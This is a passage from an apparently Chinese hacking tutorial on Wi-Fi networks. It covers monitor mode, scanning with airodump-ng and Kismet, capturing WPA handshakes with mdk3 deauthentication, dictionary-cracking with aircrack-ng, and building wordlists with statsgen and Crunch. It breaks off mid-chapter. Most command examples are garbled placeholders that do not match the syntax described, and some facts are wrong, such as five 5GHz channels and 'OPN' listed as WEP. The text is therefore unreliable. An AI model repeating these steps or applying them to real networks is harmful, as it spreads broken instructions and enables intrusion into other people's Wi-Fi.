  ![](img/image_rsrc4A0.jpg)\n\n第 36 章\n\n## 理解无线网络\n\n![](img/image_rsrc4A0.jpg)\n\
  \n与有线网络相比，无线网络的构建非常简单，只需要一个无线路由器和一个无线客户端。本节将介绍无线网络的组成和工作流程。\n\n## 无线网络的组成\n\n通常，一个无线网络由路由器和一个无线客户端组成。在技术术语中，路由器通常被称为\
  \ `AP`（接入点），而无线客户端被称为 `STA`（站）。）。即带有无线网卡的客户端，例如手机手机、笔记本电脑和平板电脑。在无线网络中，至少有一个 `AP`\
  \ 和一个或多个无线客户端。\n\n### 无线网络工作流程\n\n当用户对无线网络的结构有了清晰的了解后，将介绍其工作流程。\n\n该工作流程包含以下四个步骤：\n\
  \n1) 因为 `AP` 会定期广播 `SSID`，`STA` 可以监听由 `AP` 发送的信号。当 `STA` 加入无线网络时，它会发送探测请求。当 `AP`\
  \ 接收到请求后，它会响应一个包含频段信息的响应包。此时，`STA` 将切换到指定的频段。\n\n2) 然后 `STA` 将提供密码来认证无线网络。当 `AP`\
  \ 确认 `STA` 提交的认证信息正确后，`STA` 将被允许访问无线网络。\n\n3) `STA` 和 `AP` 通常会建立关联。在关联过程中，`STA`\
  \ 和 `AP` 应该根据信号强度协商传输速率，直到关联成功。在此过程中，一个 `STA` 同时只能与一个 `AP` 关联。\n\n4) 此时，`STA` 和\
  \ `AP` 可以进行计数\n\n`802.11` 是无线局域网的一种常用标准，由电气电子工程师学会（`IEEE`）为无线局域网制定的。虽然 Wi-Fi 经常与\
  \ `802.11` 混淆，但它们并不是同一东西。如果你想渗透无线网络，必须理解它的协议标准。因此，接下来的章节将详细介绍 `802.11` 协议。\n\n###\
  \ 什么是 802.11 协议？\n\n`802.11` 是由 `IEEE` 最初制定的 WLAN 标准，也是 WLAN 领域第一个国际认可的协议。它主要用于解决办公局域网和校园网中用户与用户终端之间的无线访问。它的最大速率只能达到\
  \ `2Mbps`。\n\n由于 `802.11` 在速度和传输距离方面无法满足需求，`IEEE` 团队继引入了两个新标准 `802.11b` 和 `802.11a`。这三种技术的主要区别在于\
  \ MAC 子层和物理层。\n\n可以理解为每个 `802.11` 协议标准使用不同的频段。有两个频段，分别为 `2.4GHz` 和 `5GHz`。这两个频段的区别将在稍后解释。\n\
  \n### 802.11ac 协议\n\n`802.11ac` 是 `802.11n` 的继任者。它基于 `802.11a` 标准，包括使用 `802.11ac`\
  \ 的 `5GHz` 频段。`802.11ac` 每个通道的工作带宽将从 `802.11n` 的 `40MHz` 增加到 `80MHz` 甚至 `160MHz`。此外，实际频率调制效率将提高约\
  \ `10%`。最后，理论传输速度将从 `802.11n` 的最高 `600Mbps` 跃升到 `1Gbps`。\n\n实际传输速率可以在 `300 Mbps`\
  \ 到 `400 Mbps` 之间，约为 `802.11n` 当前实际传输速率的 3 倍（`802.11n` 无线路由器的当前实际传输速率在 `75 Mbps`\
  \ 到 `150 Mbps` 之间），足以在一个通道上同时传输多个压缩视频流。\n\n### 2.4GHz 频段\n\n频是指无线信号的频率范围。无线信号在指定的频率范围内传输数据。`2.4GHz`\
  \ 频段的频率范围是 `2.4～2.4835GHz`。为了充分利用这个频段，范围被分为若干部分，每部分称为一个 `channel`（通道）。\n\n目前，主流\
  \ WiFi 网络通常支持 13 个通道。尽管中心频率不同，但它们都占用特定的频率范围，因此会出现某些重叠情况。\n\n通过了解这 13 个通道的频段，有助于理解三个非重叠通道的含义。无线网络可以在多个通道上运行。无线信号覆盖区域内的各种无线网络设备应尽可能使用不同的通道，以避免信号间的干扰。\n\
  \n实际上有 14 个通道，但第 14 个通道通常不使用。每个通道的有效宽度为 `20MHz`，还有 `2MHz` 的强制隔离带。也就是说，中心频率为 `2412MHz`\
  \ 的通道 1 的频率范围是 `2401 ~ 2432 MHz`。\n\n从图中可以看出，`1`、`6` 和 `11` 三个通道（用实线标记）之间没有重叠。也就是说，常说的三个互不重叠的通道。也容易看到其他通道之间频段的重叠。此外，如果设备支持，还有三组互不干扰的通道\
  \ `(2, 7, 12)`、`(3, 8, 13)` 和 `(4, 9, 14)`。\n\n### 5GHz 频段\n\n随着时代的发展，`5GHz` 频段逐渐进入人们的生活。`5GHz`\
  \ 比 `2.4GHz` 频率更高、波长更短，因此渗透能力和距离较弱，但数据传输更快。\n\n`5GHz` 支持五个通道，分别为 `149`、`153`、`157`、`161`\
  \ 和 `165`。当 `5GHz` 源很少时，可以任意选择通道。\n\n### 带宽 全这里的指的是通道带宽。通道带宽也被称为 `band bandwidth`，是调制载波占用的频率范围。在常用的\
  \ `2.4～2.4835GHz` 频段中，每个通道的带宽为 `20MHz`。可以发现 `802.11n` 包含了两种带宽，即 `20MHz` 和 `40MHz`。\n\
  \n其中 `20MHz` 在 `802.11n` 中可以达到 `144Mbps`，具有良好的渗透性和传输距离（约 100 米）。`40MHz` 在 `802.11n`\
  \ 中可以达到 `300Mbps`，但其渗透性稍差，传输距离较短（约 50 米）。\n\n如果读者对上面的解释不清楚，可以将这两种带宽比作道路的宽度。路越宽，同时运行的数据越多，从而提高了速度。然而，无线网络的“路”是大家共用的。当一个用户占用宽路并运行大量数据时，很容易发生碰撞。一旦发生事故，所有人都会慢下来，甚至比在窄路上走路还慢。\n\
  \n可以看出 `802.11b/g` 协议允许四个 `APS` 同时使用。如果一个 `AP` 使用 `40MHz`，则只有两个 `APS` 可以同时使用。因此，带宽的选择主要取决于周围有多少个工作的\
  \ `APS`。如果周围干扰不大，建议使用 `40MHz` 带宽，以获得更高的传输速度。\n\n## 接下来？\n\n希望本章对无线网络的工作原理给出了清晰的解释。世界变化变化，现在用户可以使用数十种无线模式。作为黑客，关注市场上出现的新无线设备和模式至关重要。不断检查无线设备的漏洞。在下一章中，我们将详细讨论无线安全。请继续关注！\n\
  \n\n\n\n\n![](img/image_rsrc4A0.jpg)\n\n无线网络安全是一种用于保护无线网络安全的相关设置。在大多数路由器中，支持三种无线加密方法，分别是\
  \ `WEP`、`WPS` 和 `WPA/WPA2`。此外，为了方便连接无线网络，用户可能不使用加密。本节将介绍这些加密方法和配置。\n\n## 无密码模式\n\
  \n无密码模式意味着你可以无需使用密码即可快速连接到无线网络。然而，这种模式没有安全性。下节将以 TP-LINK 路由器为例，介绍无线网络的每种加密模式。\n\n\
  具体的操作步骤如下：\n\n1) 登录路由器的管理界面。通常，路由器的默认地址为 `192.168.1.1` 或 `192.168.0.1`。本例中的路由器地址为\
  \ `192.168.0.1`。因此，在浏览器中输入地址 `http://192.168.0.1`，将弹出密码登录对话框。\n\n2) 在对话框中输入登录用户名和密码，然后点击\
  \ `登录` 显示路由器的主界面。\n\n3) 在左侧列选择“无线设置” | “无线安全设置”，将显示包含各种设置的界面。\n\n4) 从此界面可以看到所有支持的加密方法，包括\
  \ `WPA-PSK/WPA2-PSK`、`WPA/WPA2` 和 `WEP`。在此处设置无密码模式。选择“不开启无线安全”单选按钮。然后，点击底部的 `保存`\
  \ 按钮，将弹出提示对话框。\n\n5) 这提示用户在设置生效前重启路由器。点击 `确定` 按钮，界面底部将显示重启路由器的提示信息。\n\n6) 从此界面你可以看到用户已更改了无线设置，这些设置将在重启后生效。此时，点击\
  \ `重启` 选项，将弹出重启路由器的界面。\n\n7) 点击 `重启路由器` 按钮重启路由器。启动后，设置将生效。此时，用户无需输入密码即可快速连接到无线网络。\n\
  \n在本章的下一节中，我们将通过解释几个著名的模式来介绍无线网络模式。\n\n# 无线网络模式\n\n### a) WEP 模式\n\n`WEP`（无线等效隐私）可以加密在两个设备之间无线传输的数据，防止非法用户窃听或入侵无线网络。然而，该协议存在一些缺点，因此很容易受到攻击。目前很少有人使用这种加密方法。\n\
  \n下面将描述 `WEP` 模式的设置方法。\n\n以 TP-LINK 路由器为例设置 `WEP` 加密模式。\n\n具体的操作步骤如下：\n\n1) 登录路由器管理界面。然后在左侧列选择“无线设置”\
  \ | “无线安全设置”，将显示界面。\n\n2) 在此界面中选择 `WEP` 单选按钮，即 `WEP` 加密模式，然后用户可以设置此加密方法的认证类型、密钥格式和\
  \ `WEP` 密钥。其中，认证类型包括自动、开放系统和共享密钥。密钥格式包括 ASCII 和十六进制。当用户选择 `开放系统`时，无线网络中的主机可以在不提供认证密码的情况下通过认证并关联无线网络。\n\
  \n然而，如果你想传输数据，必须提供正确的密码。当用户选择 `共享密钥`时，无线网络中的主机必须提供正确的密码才能通过认证。否则，无法关联无线网络也无法进行数据传输。如果用户不想进行设置，可以选择\
  \ `自动` 选项。对于 `WEP` 密钥格式，用户可以根据自己的喜好选择。设置完成后，点击 `保存` 按钮，将弹出提示对话框。\n\n3) 点击 `确定` 显示你已选择的所有设置的界面。\n\
  \n4) 点击 `重启` 按钮显示重启路由器的界面。\n\n5) 点击 `重启路由器` 按钮重启路由器。路由器重启后，用户可以通过 `WEP` 加密连接到无线网络。\n\
  \n### b) WPA/WPA2 模式\n\n`WPA`（无线保护接入）具有两个标准，`WPA` 和 `WPA2`，是一种保护无线计算机网络安全的系统。由于\
  \ `WE` 协议存在严重缺陷，`WPA/WPA2` 用于取代 `WEP`。尽管这种加密方法非常安全，用户仍然可以通过捕获握手包来破解密码。\n\n下面描述了\
  \ `WPA/WPA2` 模式的设置方法。\n\n具体的操作步骤如下：\n\n1) 登录路由器并打开无线安全设置界面。\n\n2) 从此界面可以看到两种 `WPA/WPA2`\
  \ 加密模式。其中，`WPA-PSK/WPA2-PSK` 针对小型企业或家庭网络。`WPA/WPA2` 模式通常用于大型企业。\n\n然后，设置认证类型、加密算法和\
  \ `PSK` 密码。认证类型包括自动、`WPA-PSK` 和 `WPA2-PSK`。加密算法包括自动、`TKIP`（新的 `802.11n` 不支持此加密算法）和\
  \ `AES`。选择 `自动` 选项。在此点击 `保存` 按钮。随后，根据提示重启路由器使设置生效。\n\n### c) WPS 模式\n\n`WPS`（无线保护启动）是\
  \ WiFi 联盟组织并实施的一项项目，主要用于简化无线网络设置。通常，用户在创建无线网络时，会设置无线网络名称和加密方法以确保网络安全。当这些设置完成后，客户端连接无线网络时必须输入名称和密码。为了方便输入，你可以通过\
  \ `WPS` 模式快速连接到无线网络。下面将介绍 WPS 模式的设置方法。\n\n提示：某些路由器的按钮显示为 `WPS`，有些显示为 `QSS`。\n\n\
  具体的操作步骤如下：\n\n1) 登录路由器并选择无线安全选项，将显示界面。\n\n2) 从此界面可以看到 `QSS` 功能状态为关闭，即 `WPS` 功能未启用。在此，点击\
  \ `开启 QSS` 按钮启动 `WPS` 功能。点击 `开启 QSS` 按钮后，将显示重启路由器的提示对话框。\n\n3) 点击 `确定` 显示重启功能的界面。\n\
  \n4) 点击 `重启` 按钮显示重启路由器的对话框。\n\n5) 重启路由器后，你可以看到 `WPS` 功能已成功启用。\n\n6) 从此界面可以看到 `QSS`\
  \ 功能已启用。因此，`WPS` 模式已成功启动。下一步，用户可以通过按下 `WPS/QSS` 键快速连接到无线网络。\n\n\n\n\n\n## 模式\n\n\
  - **托管模式 (Managed mode)**：当用户的无线客户端直接连接到无线接入点 (`WAP`) 时使用。在此模式下，无线网卡的驱动程序依赖 `WAP`\
  \ 来管理整个通信过程。\n- **自持网络模式 (Ad hoc mode)**：也称为点对点模式。当用户的网络由相互连接的设备组成时使用。在此模式下，无线通信双方共同承担\
  \ `WAP` 的责任。\n- **主模式 (Master mode)**：某些高端无线网卡支持主模式。该模式允许无线网卡通过特殊的驱动程序和软件作为其他设备的\
  \ `AP`（接入点）。\n- **监听模式 (Monitor mode)**：这是从使用角度来看，最重要的模式。如果网络客户端不是为了发送接收数据，而是用于监控网络中的所有数据包，则可以使用监听模式。\n\
  \n## 支持监控的无线网卡\n\n如果你想监控无线网络，使用的无线网卡必须支持监听模式。\n\n上述列出了许多无线网卡。对于 2.4GHz WiFi 网络，建议用户选择带有\
  \ `3070` 或 `8187` 芯片的无线网卡。对于 5GHz WiFi 网络，仅支持带有 `RT3572` 和 `RTL8812AU` 芯片的无线网卡。\n\
  \n### 设置监听模式\n\n当用户选择合适的无线网卡时，可以将该无线网卡设置为监听模式。通常情况下，用户通过 `airmon-ng` 命令将无线网卡设置为监听模式。\n\
  \n语法格式如下：\n\n```\nroot@exampleserver : airmon-ng start set\n```\n\n在上述语法中，参数 `start`\
  \ 表示启动监听模式。`Interface` 指无线网络接口。\n\n将无线网卡设置为监听模式。\n\n执行以下命令：\n\n```\nroot@exampleserver\
  \ : set=network\n```\n\n从输出信息可以看出，监听模式已成功启动，其监控接口为 `wlan0mon`。\n\n### 设置 5G WiFi\
  \ 网络网卡的监听模式\n\n目前，有两种支持 5G WiFi 的常用网卡芯片，即 `RT3572` 和 `RTL8812AU`。`RT3572` 芯片的无线网卡设置与普通无线网卡相同，可以直接使用\
  \ `airmon-ng` 命令启动监听模式。\n\n然而，`RTL8812AU` 芯片的无线网卡需要安装驱动，并手动设置监听模式。以下描述了将 `RTL8812AU`\
  \ 芯片无线网卡设置为监听模式的方法。\n\n将 `RTL8812AU` 芯片无线网卡设置为监听模式。\n\n具体的操作步骤如下：\n\n1) **安装驱动**。\n\
  \n执行以下命令：\n\n```\nroot@exampleserver : install driver\n```\n\n执行上述命令后，如果没有报告错误，则驱动安装成功。\n\
  \n2) **检查无线网卡的模式**。\n执行以下命令：\n\n```\nroot@exampleserver : check mode\n```\n\n从输出信息可以看出，无线网卡当前的工作模式为\
  \ `Managed`。\n\n3) **停止无线网卡接口**。\n\n执行以下命令：\n\n```\nroot@exampleserver: air-mag\
  \ stop\n```\n\n4) **将无线网卡设置为监听模式**。\n\n执行以下命令：\n\n```\nroot@exampleserver: air-mag\
  \ mode = network\n```\n\n5) **启动无线网卡**。\n\n执行以下命令：\n\n```\nroot@exampleserver: air-mag\
  \ wireless\n```\n\n6) **再次检查无线网卡的模式**。\n\n执行以下命令：\n\n```\nroot@exampleserver: air-mag\
  \ check start\n```\n\n从输出信息可以看出，芯片已成功设置为 `Monitor` 模式。其中，监听模式下的接口名为 `wlan0`。\n\n\
  ## 扫描无线网络\n\n扫描无线网络意味着扫描周围的无线网络信号以寻找渗透测试的目标。如果用户想要实施渗透测试，他们需要知道目标无线网络的一些基本信息，例如\
  \ `AP` 名称、MAC 地址和工作通道。通过扫描无线网络并分析扫描结果，选择相应的工具来实现渗透测试。本节将介绍扫描无线网络的方法及详细说明。\n\n##\
  \ 第 39 章：Airodump-ng 工具的使用\n\n![](img/image_rsrc4A0.jpg)\n\n### 使用 Airodump-ng 工具\n\
  \n`airodump-ng` 是 `Aircrack-ng` 工具集中的工具，用于扫描周围的无线网络信号。通过分析捕获的无线信号包，可以获取周围开放 `AP`\
  \ 的名称、MAC 地址、通道和加密方法。本节介绍了使用 `airodump-ng` 工具扫描无线网络的方法。\n\n使用 `airodump-ng` 工具扫描无线网络的语法如下：\n\
  \n```\nroot@exampleserver: airodump scan\n```\n\n在上述语法中，参数 `interface` 指无线网卡的监听接口。\n\
  \n使用 `airodump-ng` 工具扫描无线网络。\n\n执行以下命令：\n\n```\nroot@exampleserver: airodump wireless\n\
  ```\n\n从输出信息中可以看到扫描到的无线网络信息。上述输出信息中有许多列，每个列参数的含义如下：\n\n1. **BSSID**: 表示无线接入点的 MAC\
  \ 地址。\n2. **PWR**: 由网卡报告的信号强度，主要取决于驱动程序。如果 `BSSID` 和 `PWR` 均为 `-1`，则表示网卡不支持信号强度报告。\n\
  3. **Beacons**: `AP` 发出的信标数量。每个接入点 (`AP`) 每秒发送约 10 个。\n4. **Data**: 捕获的数据包数量（如果是\
  \ `WEP` 则代表 IV 数量），包括广播包。\n5. **s**: 过去 10 秒内每秒捕获的数据包数。\n6. **Ch**: 通道号（从信标获取）。\n\
  7. **Mb**: `AP` 支持的最大速率。如果值为 `11`，表示使用 `802.11b` 协议；如果是 `22`，表示使用 `802.11b+` 协议；如果更高，表示使用\
  \ `802.11g` 协议。如果值包含点（`54` 之后），表示支持短帧。如果包含 `' e'`，表示网络启用了 `QoS(802.11 e)`。\n8. **Cipher**:\
  \ 检测到的加密算法为 `CCMP`、`WRAAP`、`TKIP`、`WEP` 和 `WEP104` 之一。通常（但并非绝对）`TKIP` 与 WPA 使用，`CCMP`\
  \ 与 WPA2 使用。如果密钥索引大于 `0`，则显示为 `WEP40`。标准情况下，索引 `0 ~ 3` 为 40 位，104 位应为 `0`。\n9. **Auth**:\
  \ 使用的认证方法。常用的有 `MGT`（WPA/WPA2 使用独立的认证服务器，如 `802.1x`、`radius` 和 `eap` 等）、`ska`（WEP\
  \ 的共享密钥）、`PSK`（wpa/wpa2 的预共享密钥）或 `OPN`（WEP）。\n10. **ESSID**: 所谓的 SSID 名称。如果启用了隐藏\
  \ SSID，它可以为空或显示为 `< length: 0 >`。在这种情况下，`airodump-ng` 尝试从 `proberesponse` 和 `associationrequests`\
  \ 获取 SSID。\n11. **Station**: 客户端的 MAC 地址，包括已连接和想要搜索无线网络的客户端。如果客户端未连接，则会在 `BSSID`\
  \ 下显示未关联 (not associated)。\n12. **Rate**: 表示传输速率。\n\n\n\n\n\n13. `Lost`: 基于序列号检测，在过去\
  \ 10 秒内丢失的数据包。这意味着从客户端发送的数据丢失了，且每个非管理帧都包含一个序列号字段。通过从刚接收到的帧的序列号减去上一帧的序列号，我们就可以知道丢失了几个数据包。\n\
  \n14. `Frames`: 客户端发送的数据包数量。\n\n15. `probe`: 客户端探测的 ESSID。如果客户端正尝试连接某个 AP 但尚未连接，则将显示在此处。\n\
  \n# Kismet 工具的使用\n\nKismet 是一款用于嗅探无线网络的工具。使用该工具，你可以监控周围的无线信号并查看所有可用的无线接入点（AP）。下节将介绍使用\
  \ `Kismet` 工具扫描无线网络的方法。\n\n## 使用 Kismet 工具扫描无线网络。\n\n具体的操作步骤如下：\n\n1) 启动 Kismet\
  \ 工具。\n\n执行以下命令：\n\n```\nroot@exampleserver: kismet start\n```\n\n执行上述命令后，将显示相应的界面。\n\
  \n2) 该界面用于设置是否使用终端的默认颜色。由于 `Kismet` 的默认颜色为灰色，某些终端无法显示，因此此处不使用默认颜色。此时点击 `No` 按钮，将显示界面。\n\
  \n3) 界面提示正在使用 root 用户运行 `Kismet` 工具。点击 `OK` 按钮，将显示界面。\n\n4) 界面提示是否自动启动 `Kismet`\
  \ 服务。点击 `Yes` 按钮，将显示界面。\n\n5) 界面显示了关于设置 `Kismet` 服务的信息。在此处使用默认设置，然后点击 `Start` 按钮显示界面。\n\
  \n6) 界面显示未定义的包资源。你是否现在就添加它们？点击 `Yes` 按钮，将显示带有结果的界面。\n\n7) 在此界面指定无线网卡接口和描述信息。在 `Intf`\
  \ 文本框中输入无线网络接口 `wlan0`。然后点击 `Add` 按钮，将显示界面。\n\n8) 点击界面上的 `Close Console Window`\
  \ 按钮开始扫描无线网络。\n\n9) 所有由 `Kismet` 工具扫描到的无线 AP 信息都可以从此界面看到。在界面的左侧显示了捕数据包的时间、扫描的网络数量和数据包数量。用户会发现，在此界面中只能看到搜索到的无线\
  \ AP、信道和包大小信息，但看不到这些 AP 及其连接客户端的 MAC 地址。此外，默认情况下无法选择 AP。如果你想查看连接到当前 AP 的客户端，也需要进行设置。依次在菜单栏中选择\
  \ `Sort|First Seen` 命令，然后在上方选择 `AP`，即可在第二个屏幕中显示连接的客户端。\n\n10) 从此界面可以看到，显示了名为 `CU_655w`\
  \ 的 AP 详情以及已连接的客户端。\n\n例如，连接客户端的 MAC 地址为 `fc: 1a: 11: 9e: 36: a6`。AP 的 MAC 地址为 `70:85:40:53:E0:3B`，工作信道为\
  \ `9`，加密方法为 `TKIP`、`WPA` 和 `PSK`。\n\n11) 从此界面可以看到，显示了名为 `CU_655w` 的 AP 详情以及已连接的客户端。\n\
  \n\n\n\n\nWPA/WPA2 加密本质上是安全的。然而，只要用户捕获了握手包并拥有足够强大的密码字典，就可能暴力破解密码。本节将介绍使用 `Aircrack-ng`\
  \ 工具暴力破解 WPA/WPA2 无线网络密码的方法。\n\n使用 `Aircrack-ng` 工具暴力破解 WPA/WPA2 无线密码的具体操作步骤如下：\n\
  \n1) 启动监控模式并扫描无线网络。\n\n从输出信息可以看到所有扫描到的无线网络。此时，选择使用 `WPA/WPA2` 加密的无线网络。例如，在这里选择 `CU_655w`\
  \ 无线网络来实现暴力破解。\n\n2) 使用 `Airodump-ng` 工具重新捕捉数据包，并指定目标 AP 的 `BSSID`、`channel` 和文件保存位置。\n\
  \n执行命令如下：\n\n```\nroot@exampleserver: airodump bssid\n```\n\n看到上述输出信息表示正在数据数据包。但是，如果你想破解此无线网络的密码，必须捕获握手包。此时，用户可以使用\
  \ `mdk3` 工具进行拒绝攻击，以加快握手包的获取速度。\n\n其语法格式如下：\n\n```\nroot@exampleserver: handshake\n\
  ```\n\n在上述语法中，选项 `d` 表示执行拒绝攻击。`-s` 指定发送拒绝包的时间间隔。`-c` 指定攻击通道，即 AP 所在的通道。\n\n3) 使用\
  \ `mdk3` 工具进行拒绝攻击以获取握手包。\n\n执行命令如下：\n\n```\nroot@exampleserver: mdk3\n```\n\n执行上述命令后，将没有信息输出。此时，返回\
  \ `Airodump-ng` 抓包界面观察是否捕获到了握手包。如果捕获了握手包，AP 的 MAC 地址将显示在右上角。\n\n正如右上角所示，显示了 `WPA\
  \ handshake`。因此，握手包已成功捕获。接下来，用户可以实施暴力破解。在扫描过程中，生成的采集文件名为 `wlan-01.cap`。\n\n4) 实施暴力破解，并指定使用\
  \ `pass.txt` 作为密码字典。其中，密码字典需要用户手动创建。\n\n执行命令如下：\n\n```\nroot@exampleserver: brute\
  \ force dictionary.txt\n```\n\n从输出信息可以看出，`CU_655w` 无线网络的密码已成功破解，密码为 `\"exampleserver\"\
  `。\n\n## 防护措施\n\n从之前的介绍中发现，`WEP` 加密和 `WPA/WPA2` 加密都可以破解。为了让你的无线网络尽可能安全，用户可以采取一些防护措施。\n\
  \n* 下面将介绍几种防护措施。\n* 修改无线路由器的默认设置。\n* 禁止 `SSID` 广播以防止被扫描和搜索。\n* 关闭 `WPS/QSS` 功能。\n\
  * 启用 `MAC` 地址过滤。\n* 设置复杂的密码。例如，包括大小写字母、数字和特殊符号。\n\n# 第 41 章：创建暴力破解字典\n\n![](img/image_rsrc4A0.jpg)\n\
  \n在模块的几个章节中，我们讨论了无线攻击。由于无线网络密码被应用于技术的几乎每一个部分，网站、操作系统、在线服务器以及许多设备都使用密码来保护信息。对于 Try\
  \ 图破解这些密码的黑客来说，这是一项挑战性任务。如今，人们已经意识到了这一点并使用强密码。然而，仍有数百人不知道这一点，如果他们尝试，可以帮助我们。本章将详细介绍暴力破解。请跟上操作！\n\
  \n# 创建密码字典\n\n这里的字典是指密码字典。如果你想实施密码攻击，密码字典是必不可少的。用户可以收集和分析密码信息以创建一个更合理的密码字典。这样做不仅可以提高破解成功率，还可以缩短破解时间。本节将介绍如何创建字典。\n\
  \n## 密码信息收集\n\n在创建密码字典之前，你可以收集密码。例如，你可以收集与目标相关的电子邮件地址、网站博客文章、Twitter 动态、单位名称和人员姓名等信息。因为大多数用户为了方便记忆会使用最简单的密码，或者使用与个人相关的信息（如单位名称、门牌号等）作为密码。此时，如果将这些信息收集并添加到字典文件中，就可以提高破解成功率。\n\
  \n# 加密策略分析\n\n密码策略意味着系统对用户设置的密码实施各种限制，例如不允许只使用数字、连续数字和英文字母等。例如，某些软件或系统会有相应的密码策略来提高其安全性。此时，用户可以通过分析这些设备的密码策略来有针对性地创建密码字典。下节将介绍密码策略分析方法。\n\
  \n### 1) 软件/系统固有策略\n\n固有策略是指构建在软件/系统内部的密码策略。为了安全，某些软件/系统具有固定策略以避免被轻易破解。如果软件/系统有固有策略，用户在注册账户时会被提示最小密码长度和复杂性要求。\n\
  \n例如，在安装 `Oracle` 数据库时，用户会被提示设置的密码足够复杂。当安装 `Linux` 操作系统时，会提示设置 `root` 用户密码。此时，用户可以通过分析软件/系统的固有策略来创建相应的字典。\n\
  \n### 2) 强化策略\n\n强化策略是指软件系统的额外建议标准。例如，在 `Windows` 系统中，使用组策略强化密码策略，允许用户设置更安全的密码。此时，用户可以使用组策略分析工具分析密码策略，然后构建更强大的字典。下节将介绍如何使用组策略工具分析密码策略。\n\
  \n#### 使用组策略分析密码策略\n\n具体步骤如下：\n\n1) 使用 `Win+R` 键组合启动“运行”对话框。\n2) 在“打开”文本框中输入 `gpedit.msc`\
  \ 命令，然后点击“确定”打开“本地组策略编辑器”界面。\n3) 在左列中选择`计算机配置` | `Windows 设置` | `安全设置` | `账户策略`\
  \ | `密码策略`，将显示密码策略设置界面。\n4) 从此界面，可以看到 `Windows` 系统密码策略的相关设置，例如是否启用复杂性要求、最小密码长度值、使用期限以及是否记住密码历史等。\n\
  \n### 3) 分析现有的密码字典策略\n\n\n\n\n用户可以分析目标用户相关分组的泄露密码，获取相似分组的密码设置策略，并以此构建新的字典。马尔可夫攻击（Markov\
  \ Attack）可以分析现有的密码字典文件，统计字典中每个字符的出现概率、位置分布和上下文。然后，结合这些规则，可以使用掩码（mask）生成更有效的密码字典。Kali\
  \ Linux 提供了一个名为 `statsgen` 的工具支持马尔可夫攻击技术。本节将介绍使用该工具分析密码字典策略的方法。\n\n语法格式如下：\n\n```bash\n\
  statsgen [options] passwords.txt\n```\n\n在上述语法中，`options` 代表可用选项；passwords.txt`\
  \ 代表被分析的密码字典。\n\n使用 `statsgen` 工具分析 `rockyou.txt` 密码字典。\n\n### 1) 执行命令如下：\n\n```\n\
  root@exampleserver:～# statsgen rockyou.txt\n```\n\n执行上述命令后，它将开始分析指定的密码字典并进行统计。其中，输出信息包括工具的基本统计信息、密码长度、字符集、密码复杂度、简单掩码和高级掩码。\n\
  \n为了让用户更清晰地了解输出结果，本节将逐一介绍信息的每个部分。其中，第一部分信息是 `statsgen` 工具的基本信息，如下。\n\n从输出信息中，你可以看到\
  \ `statsgen` 工具的版本信息、被分析的密码文件以及该密码文件的统计情况。\n\n通过分析输出信息可以看出，工具版本为 `0.0.3`；被分析的密码字典为\
  \ `rockyou.txt`；密码字典包含 `14,344,392` 个密码。\n\n### 2) 以下是密码长度统计信息。上述信息基于密码字典中密码长度的统计，并根据密码长度比例降序排列。其中，输出信息分为\
  \ 3 列，分别是密码长度、占密码总数的比例以及密码总数。\n\n例如，第一行信息表示密码长度为 `8`，占密码总数量的 `20%`，匹配该长度的密码总数为 `2966037`\
  \ 个。\n\n### 3) 以下是密码字符集的统计。\n\n从输出信息中，我们可以看到分析并统计了密码字典中的各种密码字符集。\n\n### 4) 以下是密码复杂度统计。上述是对密码复杂度的统计。输出信息分为\
  \ 3 列，分别表示构成密码的字符以及此类字符的使用情况。密码的最小字符数和密码中此类字符的最大数量。\n\n### 5) 以下是简单掩码统计：上述信息是对密码字符串掩码格式的简单统计。\n\
  \n例如，`stringdigit` 意味着字母在前、数字在后；`stringdigitstring` 意味着字母在前、数字在中、字母在后。\n\n### 6)\
  \ 以下是密码字符串掩码格式的高级统计：上述信息是对密码字符串的高级统计。其中，高级统计是用掩码格式表示密码文件中的字符。统计后使用了四种掩码格式，每种格式由一个\
  \ `?`（问号）组成，添加一个小写字母来表示一组字符。\n\n这四种掩码格式的表示和含义如下：\n\n- `L`：代表小写字母 `a` 到 `z` 的字符集。\n\
  - `U`：代表大写字母 `A` 到 `Z` 的字符集。\n- `D`：代表数字 `0-9` 的字符集。\n- `S`：代表特殊符号的字符集合。\n\n在得到的掩码格式中，一个掩码代表密码中的一个数字。例如，`?l?l?l?l?d?d?d?d`\
  \ 掩码格式表示由 4 个 `?l` 和 4 个 `?d` 组成的 8 位密码。其中，前 4 位由小写字母 `a` 到 `z` 组成，后 4 位由数字 `0-9`\
  \ 组成。\n\n# 第 42 章生成破解密码字典\n\n在用户收集了足够的目标用户信息密码策略后，可以根据获取的信息创建密码字典。下面将介绍使用 `Crunch`、`rsmangler`\
  \ 和 `rtgen` 工具生成字典的方法。\n\n### 1) 使用 Crunch 工具\n\n`Crunch` 是一个密码字典生成器。它可以根据指定的规则生成密码字典，用户可以灵活地自定义自己的密码字典文件。下面将介绍使用\
  \ `Crunch` 工具生成字典文件的方法。\n\n使用 `Crunch` 工具生成字典的语法格式如下：\n\n```bash\ncrunch [min] [options]\n\
  ```\n\n在上述语法中，参数表示生成密码的最小长度；表示生成密码的最大长度；表示指定的字符集。`[options]` 表示有效选项。\n\n其中，常用的选项及其含义如下：\n\
  \n- `-O`：指定生成的密码字典文件名。\n- `-B number[type]`：指定写入文件的最大字节数。大小可以用 `KB`、`MB` 或 `GB`\
  \ 指定，但必须配合 `-o` 选项使用。\n- `-T`：设置使用的特殊格式。\n- `-L`：该选项用于在使用 `-t` 选项时识别占位符的某些字符。\n\n\
  `-t` 选项指定 `@`、`%` 或 `^`。`Crunch` 工具提供的默认字符集保存在 `/usr/share/crunch/charset.lst`。用户可以使用\
  \ `cat` 命令查看所有字符集，如下：\n\n```\nroot@exampleserver:/usr/share/crunch# cat \n```\n\n\
  上述输出为所有字符集。在输出信息中，等号左侧表示字符集的名称，右侧表示使用的字符。\n\n使用 `Crunch` 工具生成一个最小长度为 `8`、最大长度为 `10`\
  \ 的密码，并保存到 `/root/crunch.txt` 文件。\n\n其中，使用的字符集是 `hex-lower`。\n\n执行命令如下：\n\n```\n\
  root@exampleserver:～# crunch 8 10 hex-lower -o /root/crunch.txt\n```\n\nCrunch 现在将生成以下数据：`13304332288\
  \ bytes`、`12688 MB`、`12 GB`、`0 TB`。`Crunch 现在将完成 100%` 生成输出。\n\n从输出信息可以看出，将生成一个\
  \ `12GB` 的字典，包含 `1224736768` 个密码。此外，生成的进度以百分比显示。用户想查看字典中的密码，可以使用 `vi` 编辑器或 `cat`\
  \ 命令查看。如下：\n\n```\nroot @exampleserver: ~ # cat \n```\n\n### 2) 使用 rsmangler 工具\n\
